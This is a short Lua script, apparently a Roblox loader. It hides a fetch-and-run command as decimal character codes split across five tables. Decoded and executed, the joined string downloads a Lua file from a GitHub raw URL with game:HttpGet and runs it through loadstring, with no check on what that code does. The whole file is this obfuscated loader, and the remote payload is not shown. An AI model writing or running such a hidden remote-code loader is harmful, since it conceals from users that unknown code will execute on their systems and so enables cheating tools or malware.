local a = {
108,111,97,100,115,116,114,105,110,103,40,
103,97,109,101,58,72,116,116,112,71,101,116,40,34
}

local b = {
104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,
117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47
}

local c = {
100,97,118,105,100,115,101,98,97,115,51,52,56,45,104,117,98,47,
84,101,120,116,50,49,48,47,114,101,102,115,47
}

local d = {
104,101,97,100,115,47,109,97,105,110,47,
84,101,120,116,50,49,48,46,108,117,97,34
}

local e = {
44,116,114,117,101,41,41,40,41
}

local f = {}

for _,v in ipairs(a) do table.insert(f,v) end
for _,v in ipairs(b) do table.insert(f,v) end
for _,v in ipairs(c) do table.insert(f,v) end
for _,v in ipairs(d) do table.insert(f,v) end
for _,v in ipairs(e) do table.insert(f,v) end

loadstring(string.char(unpack(f)))()
